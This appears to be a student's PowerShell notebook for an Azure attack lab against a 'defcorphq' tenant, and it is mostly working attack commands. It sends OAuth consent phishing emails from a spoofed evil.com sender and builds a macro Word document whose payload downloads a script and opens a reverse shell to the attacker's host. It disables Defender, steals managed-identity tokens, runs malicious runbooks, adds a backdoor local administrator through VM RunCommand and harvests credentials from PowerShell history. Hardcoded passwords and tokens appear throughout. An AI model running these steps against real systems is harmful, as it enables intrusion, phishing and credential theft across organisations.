Install-Module Az -Scope CurrentUser

# Login
$User = "student170@defcorpextcontractors.onmicrosoft.com"
$User = "test@defcorphq.onmicrosoft.com"
$pass = "HzyXYxn28ayRCN6F"
$pass = "SuperVeryEasytoGuessPAssw0rd!@222"
$base = "defcorphq"
$creds = New-Object System.Management.Automation.PSCredential($User, $(ConvertTo-SecureString $pass -AsPlainText -Force))
Connect-AzAccount -Credential $creds

# Check for Illicit Grant
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIDsAssignedToDefaultUserRole
# if it isn't, you need to go set it up in the GUI. See OneNote Entry (User.ReadBasic.All and User.Read)
# Let's verify that it is set up
Import-Module AzureADPreview.psd1
Connect-AzureAD -Credentials $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Now we need to send the link to the target user (like emails)
# Enumerate the webpages for those pages that allow you to send links or do phishing emails directly
Invoke-EnumerateSubDomains.ps1 -Base $base
# Look through each of these
$list = Import-Csv -Path 'C:\Users\studentuser170\Downloads\users.csv'
$mail = $list | select H3 | ?{$_.H3 -ne '' -AND $_.H3 -ne $NULL}
$link = 'https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=999ac582-fe8d-4d83-9d72-5500fa386f74&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.151.170%2Flogin%2Fauthorized&response_mode=query'
$mail | Foreach-object{$addr="You <"+$_.H3+">"; Send-MailMessage -From "Friendly Guy <user01@evil.com>" -To $addr -Subject 'Here is the report' -Body $link -Priority High -DeliveryNotificationOption OnSuccess, OnFailure -SmtpServer localhost -Port 1025 }
# Once you get a token back, you need to save it
$token='eyJ0eXAiOiJKV1QiLCJub25jZSI6IldjY3ZrbmxuUGtsY2gxYzNhNWRoV2hGZk1WSkVwWFNaMFZJdVJ4bTBrWEEiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MjI5NjY4MywibmJmIjoxNjQyMjk2NjgzLCJleHAiOjE2NDIzMDE4NzEsImFjY3QiOjAsImFjciI6IjEiLCJhaW8iOiJFMlpnWUxCdVhoQmhyWis0dzFCUmc2R29UK2VneE1TbGU5a082bWEyQmoxSXZKeTVYUVFBIiwiYW1yIjpbInB3ZCJdLCJhcHBfZGlzcGxheW5hbWUiOiJzdHVkZW50MTcwIiwiYXBwaWQiOiI5OTlhYzU4Mi1mZThkLTRkODMtOWQ3Mi01NTAwZmEzODZmNzQiLCJhcHBpZGFjciI6IjEiLCJpZHR5cCI6InVzZXIiLCJpcGFkZHIiOiI1MS4yMTAuMS4yMzkiLCJuYW1lIjoiRXJpayBNLiBLZWxsZXIiLCJvaWQiOiI0ZDFkOTkzYi02ZjUwLTRkNWItYWQ4OC1hYzRjMjYyNDNhNjYiLCJwbGF0ZiI6IjMiLCJwdWlkIjoiMTAwMzIwMDEyMEQ2RkY4NiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b0xGbXBtTl9vTk5uWEpWQVBvNGIzUndBSzQuIiwic2NwIjoiVXNlci5SZWFkIFVzZXIuUmVhZEJhc2ljLkFsbCIsInNpZ25pbl9zdGF0ZSI6WyJpbmtub3dubnR3ayJdLCJzdWIiOiJSTzVRMVQxeHR6MXJiVk0wQW40bmFyNkhZd3dVRXd4QzlCeUh2Yl82cnQwIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidW5pcXVlX25hbWUiOiJFcmlrTUtlbGxlckBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXBuIjoiRXJpa01LZWxsZXJAZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInV0aSI6IjZvTk1oNmpYZzBHTEJYQlNGQjhKQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbImI3OWZiZjRkLTNlZjktNDY4OS04MTQzLTc2YjE5NGU4NTUwOSJdLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.KfVXHfyDa64YB9f2PaQqP-VTOYn_TzqsJOBOSxLGZrZqWOdI0nnOLnDvFdCXKvoo9kEIliYHFKzLby4Z3ZulJ42pVVBYoEqKfUJ32-v3mCoNKkMySR6DuFrfsd8UL2IUHva2Qh5i6Dz1RR-pTSO_Y-ksykSix3z2bul-fkSPv-70dFZomegAB0JnZDlm5L2qo2ziJPUx04J2ctgmov5aZ-C0Mp7hryLMgx-ovUlf3lyg69yLm8QjXHpQnsGB-HAf5mwLrNtHx3wrn3dkT3oAi2YjmJYnduR9VnXgPGb4iYnT0HVfG_l3lDUBTHMNGW6sdPBsz0oXeT-mqCpcBGBqFw'
# if you want, go to jwt.io to analyze the token or download https://github.com/ticarpi/jwt_tool
	• you should see the "scp" section which is the scope of what permissions you are giving
# Now go list the users based on this new token
$URI = 'https://graph.microsoft.com/v1.0/users'
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{ 'Authorization' = "Bearer $token" }
}
$users = (Invoke-RestMethod @RequestParams).Value
# Now you should look through the users, find someone interesting
# find some with an ApplicationAdministratorRole
# Now go back to the application in the GUI and add a few more permissions for Microsoft graph
	• Add mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send
# send that person a phishing email and see if they respond. It should pop up in the 365-stealer

# We can make a word document with a macro for a rev shell
# You have to have a computer with office installed if you want to make an office macro exploit
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
Enter-PSSession -Session $officeVM
Set-MpPreference -DisableRealtimeMonitoring $true
# Upload the Out-Word exploit to the office VM
IEX(New-Object Net.Webclient).downloadString("http://172.16.151.170:82/Out-Word.ps1")
Out-Word -Payload "powershell iex (new-object Net.webclient).downloadstring('http://172.16.151.170:82/Invoke-PowershellTcp.ps1');Power -Reverse -IPAddress 172.16.151.170 -Port 4444" -OutputFile student3.doc
exit
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\student3.doc -Destination C:\xampp\htdocs\student2.doc
# In a new terminal, start a listener
nc.exe -lvp 4444
# Upload this file using 365-Stealer for the Mark user.

## Exploiting the Apps
# exploit 1: php shell upload
$IDENTITY_HEADER="76439157-718e-4703-9409-b7827d039b67"
$IDENTITY_ENDPOINT="http://169.254.129.5:8081/msi/token"
curl "$IDENTITY_ENDPOINT?resource=http://management.azure.com/&api-version=2017-09-01" -H secret: $IDENTITY_HEADER
#-- or upload another php shell with this in there!
$token='eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDIyNzU5MDUsIm5iZiI6MTY0MjI3NTkwNSwiZXhwIjoxNjQyMzYyNjA1LCJhaW8iOiJFMlpnWUNqYlpMKzk5TGErZWQ5blYrUEhsUmI5QUE9PSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRsZXZTZ2F2TVBCQmhBb09JZTBVbVVad0FBQS4iLCJzdWIiOiJjYzY3YzkwZC1kOWU5LTQwZDItYjUxMS05ZDUyZDY3NjgyYWIiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJHNWM3TXdSR2kwLWk3WVV0b2YwZEFBIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0VuZ2luZWVyaW5nL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL2RlZmNvcnBocWNhcmVlciIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.CTUuja1paLyyZypJ9ZpDnzTLw-mbNExywczvG7bc2lCDokl-bmP3MvPly_SAOEgMyeO6J5ggBGmyImpSdaF0xjS1ewiVLFEEjdl4ko9MQkmKDaaIV83ojStqkKEwRozp97ly0zUlS5uaMVE2SkuQLbZ3mfUEe9ly1Wh-8lB0LmoUTMuuWVOK2k4kfcFqtIbpKqLF-yQ0TXp6MK7usou4t4zS3tGazqULMc9r4QuwCb7ZSqSaUYYPSVSDrjwLmjjzWSlYNY9Ima5ez9bBkcZaX5OKkcPue_kKtU9dbbWAaN7Raa9b659sCx7X1E_W852IXGg0o1G2vshdbFQvGLMpmw'
$client_id='064aaf57-30af-41f0-840a-0e21ed149946'
Connect-AzAccount -AccessToken $token -AccountId $client_id
Get-AzRoleAssignment
# if it returns an error, we have to do it manually
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{
    'Authorization' = "Bearer $token"
   }
}
(Invoke-RestMethod @RequestParams).value
# now with this subscription, let's list all the resources available
$subid = (Invoke-RestMethod @RequestParams).value.subscriptionId
$URI = "https://management.azure.com/subscriptions/$subid/resources?api-version=2020-10-01"
(Invoke-RestMethod @RequestParams).value
# this shows we have 2-VMs, network interfaces, public IP
(Invoke-RestMethod @RequestParams).value | %{ $URI = "https://management.azure.com/" + $_.id + "/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"; $URI; $RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{ 'Authorization' = "Bearer $token" } }; (Invoke-RestMethod @RequestParams).value
 }
 # It says I have read over them all except the last one, that one says I have "runCommand"!

# SSTI example
# Once you use SSTI to exploit it, pull the access token and the client_id
$token='eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MjQ1MzE4NCwibmJmIjoxNjQyNDUzMTg0LCJleHAiOjE2NDI1Mzk4ODQsImFpbyI6IkUyWmdZTmdRWGFsUWMrQ1Z5cXJmVjk2OXREaVZCQUE9IiwiYXBwaWQiOiIyZTkxYTRmZS1hMGYyLTQ2ZWUtODIxNC1mYTJmZjZhYTlhYmMiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6IngwZGU5eUJjdVVTMTdiamN3UkpUQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.A7qCx-Jj18XNH5OCVRnFiHahrJFrRLgTsZkkpNVEZwCFoso9ApJY87ci2mCXGeQYKIdYBIP1pmG0yWNJzYFQclvTNV9cPHFKf0nxisacLW11Gnhw-YKPbubdYJX4Bp0epllHsqG7AYowQYPvAJI8tf4MYC8D-VHmtoZ1oRq35tVktnOnZ51zKHk1lLsvvg71l2COwIGk6LQvaEfCnTxlcP56gpYPuq25zhx6kjQA2_hIcVpqQJeGzvYzVbmLSlJadBRkLYrRQ51qO4inRpDsUp8_z1vngBcrmp8I0h6hS-LBrt19eOIP24kA_HC6UQ6uNSNBzvvUYCJapL41Xqe3rA'
$client_id='2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'
Connect-AzAccount -AccessToken $token -AccountId $client_id
Get-AzResource
# It says we have access to Key vault, let's go
Get-AzKeyVault
Get-AzKeyVault -VaultName ResearchKeyVault

# OS Command Injection
# upload python script to pull environmental varaibles
# Once you exploit, rinse and repeat
# this one gave both a Graph and Management token. Let's use them both
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDIzMTIxNzUsIm5iZiI6MTY0MjMxMjE3NSwiZXhwIjoxNjQyMzk4ODc1LCJhaW8iOiJFMlpnWUZEZEtkRHo3YnBNTUZ2cDYwV0hBOHB2QXdBPSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRpWkU1R0pHWER4T2lvbjBZZFhWaHZKd0FBQS4iLCJzdWIiOiJlYTRjM2MxNy04YTVkLTRlMWYtOTU3Ny1iMjlkZmZmMDczMGMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJlZVljR3EySlowSzIzUFFXakFlZkFRIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0lUL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL3Byb2Nlc3NmaWxlIiwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.p1my57OcyS4pYlWBLY_wngtm-r7zBbmgMA-UmDzdjpGv-GuxQVUs6ze9JI94bVb5OTSMZ6TNQE6xCpRefy04xUL4lY4mst-OUGic40T_tFy5egtunWX8537zvtR1_pW3TSsEf22mfYU2nKvytu2HfF767EDxvlVUS4bxC7Yvmjtjwrp4qTW_5FMxc1vCKqtBAKeo0XXDshUZ3B3Sl5BWHmAEuX-cVXuLj5PBzQQ3e8NwaUF4XHXZE1-YjQM1JHAgo7Mt78j1XchkHrNLbvzVH0Jsqq-lWIU-UexBK5oYIEafavPUsDg6UXu67Mkmc25s_kKjUj2Z6EZ_PxOzzFM6QQ'
$graphtoken = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6InFQdGR2OUVkRElfRlJCeE9HU1JGYmdZcDl1REEzeWdXdTlyQ3dFTkJ5bXMiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MjMxMjE3NiwibmJmIjoxNjQyMzEyMTc2LCJleHAiOjE2NDIzOTg4NzYsImFpbyI6IkUyWmdZTmpOODlYb0xzTnZiNGI1VCtibmRGMDVBQUE9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiaFlyQk41NkZfRU85MkRGbTBxa09BQSIsInZlciI6IjEuMCIsIndpZHMiOlsiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.HaGkPXqyUdcRX2eZ9l6V9Tmiq-f8LpeFO47zqyVq_xNJTmqjnVBDw-eCeT7rdTY0pc5aCUxz9LQoKGuQpxvkbW8LjIvSCgsJU-DMfmJM6nRoMND2N1KcA542X9UkFOoqzs-c-Warcyz9c__7Fc9vsCwKh4K7DffB9IIKyR1fRPvL1xfkISOMNsG6bYJYWqjdYDtVrP6_sT5ckn-8IxTdKakGoBBmsTKgCD1w4rvN71-lJn1p_Q5jUeEbesxEjszqPq1rEsZfv1XlRyLTKLx3XkEQYhS9kMnpGNkHBvnFIG15qr7z7Lm8HdffDE2ZBBm7pgd4L3fRY-YPSCdH7irqMw'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphtoken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
Get-AzResource
# has no subscriptions, so now we enumerate again with restapi
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{
    'Authorization' = "Bearer $graphtoken"
   }
}
(Invoke-RestMethod @RequestParams).value
# So there are a bunch. The easiest way to check of we can abuse it is if we can add a credential to it, then we could abuse the SPN.
$id = 'eb29d35c-9246-427c-99f9-8b443ee7f6aa'
$URI = "https://graph.microsoft.com/v1.0/servicePrincipals/$id/appRoleAssignments"
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{
    'Authorization' = "Bearer $graphtoken"
   }
}
(Invoke-RestMethod @RequestParams).value
# If it errors, then the api is broken. Use the Add-AzADAppSecret.ps1
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
# Looks like we found one!

## Exploiting Storage
Invoke-EnumerateAzureBlobs
# this uses the permutations file. Add your own if you have a different list
Invoke-EnumerateAzureBlobs -Base defcorp -Permutations .\perms.txt
# for each one it finds, you can navigate to it and see whats up
iwr 'https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list' 
iwr 'https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list' -OutFile backup.xml
type backup.xml
# it has a "blob_client.py", let's get that
iwr -uri 'https://defcorpcommon.blob.core.windows.net/backup/blob_client.py' -OutFile blob_client.py


## Automation Attack
# Assuming we have lateraled to a user and we have a shell on the box
az ad signed-in-user show
# grab the object-id so you can use it later for AccountId
az automation account list 
# if it returns an error, we need to add the extention
az extension add --upgrade -n automation
# Now check which objects Mark owns
az ad signed-in-user list-owned-objects
# Let's get an access token
az account get-access-token --resource-type aad-graph
# Grab Access key and tenant Id
# Now go back to your powershell and migrate
Import-Module AzureAD.psd1
$AADToken = "<token_above>"
$objectId = "<object_id_of_owned_object>"
$accountId = "<object_id of user>"
$tenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
Connect-AzureAD -AadAccessToken $AADToken -TenantId $tenantId -AccountId $accountId
# no we have the user, let's add mark to the group
Get-AzureADGroupMember -ObjectId $objectId
$refId = "<userId>"
# Add a user to the group
Add-AzureADGroupMember -ObjectId $objectId -RefObjectId $accountId -Verbose
# Check to see what runbooks you can use. Jump back to the reverse shell
az automation account list
# We will need the 'id' field as the scope, 'Name' as AutomationAccountName, and 'resourcegroup' as ResourceGroupName
# Now request an automation token
az account get-access-token
# Now you can go BACK to your revshell with this value
$AccessToken = "<token>"
Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId $accountId
# Now get the role for Mark in the automation account
$scope = '/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation'
Get-AzRoleAssignment -Scope $scope
# We are in the Automation Admins, great! We can now execute Runbooks
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
# it shows the name and worker. If the worker looks like on-prem stuff, winner!
# Let's run the book with our malicious code and see what happens
Import-AzAutomationRunbook -Name student170 -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
Publish-AzAutomationRunbook -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose -Name student170
# STart your netcat listener!
Start-AzAutomationRunbook -Name student170 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose

## Abuse Managed Identify permissions to execute commands on a VM
$AccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDIzNzI2MjIsIm5iZiI6MTY0MjM3MjYyMiwiZXhwIjoxNjQyNDU5MzIyLCJhaW8iOiJFMlpnWUhBSXVsTWt1cE12NWt1NmRZckVSaDBMQUE9PSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRsZXZTZ2F2TVBCQmhBb09JZTBVbVVad0FBQS4iLCJzdWIiOiJjYzY3YzkwZC1kOWU5LTQwZDItYjUxMS05ZDUyZDY3NjgyYWIiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJZaDk4ZE52NU1VMjEyblpWUG5NUEFBIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0VuZ2luZWVyaW5nL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL2RlZmNvcnBocWNhcmVlciIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.faflZkqHpOHaLvIEOqlleEmvXplJhJLeQMcsmUWMO6RhTNwFZQvoPOet0w7arasa7UKnGwiL8ci-gzbgBpN3oCDgm8PS0j49z1gwdwhfNm6JZsAUG5Veb69yZV5S4feuQI2-OkdqOdXIVKgxeeE3PKTXerVwcyn3zx5KQUArdK05-xjWwdG57kdCzDrHurJsHkh9-O4kY182V1tXtmjiGZUOIit5tmy83CoQSFBsjmgUEQt07Cni-74Qduza5nhjP28PkC4PFlt1vbVdAqbH1_M4PDnjLIrdzW9evP-YGV6V9gXGkKyC7HjldJyYRM0sho_RhfgsOy5MIBlJ0SIr4A'
$client_id = '064aaf57-30af-41f0-840a-0e21ed149946'
Connect-AzAccount -AccessToken $AccessToken -AccountId $client_id
Get-AzResource
# So we have a VM here, let's dig in! Pull out the Name and ResourceGroup
$resources = Get-AzResource
$name = "bkpadconnect"
$resourceGroup = ($resources | ?{ $_.Name -eq $name }).ResourceGroupName
# Let's see if there are any network restrictions to connect to it
$interface = Get-AzVM -Name $name -ResourceGroupName $resourceGroup | select -ExpandProperty NetworkProfile
# Use a trick to get the last string block of the path
$interfaceName = Split-Path -Path $interface.NetworkInterfaces.Id -Leaf
Get-AzNetworkInterface -Name $interfaceName
# it says it has a public IP address...cool, let's grab that
$ipId = Split-Path -Path (Get-AzNetworkInterface -Name $interfaceName).IpConfigurations.PublicIpAddress.Id -Leaf
# Now grab that public IP
Get-AzPublicIpAddress -Name $ipId
$ipAddress = (Get-AzPublicIpAddress -Name $ipId).IpAddress
# Now let's add our user to the VM with a script. Save in a file the following (make sure the password meets the complexity requirements!:
$passwd = ConvertTo-SecureString "Stud170Password@123" -AsPlainText -Force
New-LocalUser -Name artilleryRed -Password $passwd
Add-LocalGroupMember -Group Administrators -Member artilleryRed
# save that in a file with a PS1 extention and let's upload it
Invoke-AzVMRunCommand -VMName $name -ResourceGroupName $resourceGroup -CommandId 'RunPowerShellScript' -ScriptPath C:\Users\studentuser170\Documents\vmUserAdd.ps1 -Verbose
# Did it say "succeeded"? If so, it worked (it uploaded the script and ran it, so check your script). Now we can access remotely (as long as the VM is configured to accept remote connections!)
$creds = New-Object System.Management.Automation.PSCredential('artilleryRed', $passwd)
$vmsess = New-PSSession -ComputerName $ipAddress -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $vmsess
# And winner! So now it is basic windows enumeration. Check lsass, registry, DPAPI, etc.
Get-LocalUser
# We see that bkpadconnect is that admin, he should be interesting. checking the powershell transcripts, we get some interesting creds!
gc C:\Users\bkpadconnect\AppData\Roaming\Microsoft\windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# We found another admin account and a VM with creds! It looks like he used WinRM to connect, so we could too!
# defeng-adcnct\administrator:CredsToManageCl0udSync!
# ip: 172.16.1.21
 

## Abusing KeyVault
# get the keyvault token with https://vault.azure.net&api-version=2017-09-01
